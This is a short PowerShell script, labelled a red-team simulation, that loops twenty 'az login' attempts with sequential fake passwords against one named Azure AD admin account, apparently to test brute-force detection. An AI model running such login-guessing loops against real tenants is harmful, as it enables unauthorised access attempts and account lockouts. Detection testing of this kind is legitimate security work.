# Red Team Brute-Force Simulation Script
# This script simulates an automated dictionary attack against Azure AD

for ($i=1; $i -le 20; $i++) {
    Write-Host "Simulating Attack $i..." -ForegroundColor Red
    az login -u azuredbbackupadmin@AmityUniversity089.onmicrosoft.com -p "FakePassword$i!"
    Start-Sleep -Seconds 2
}
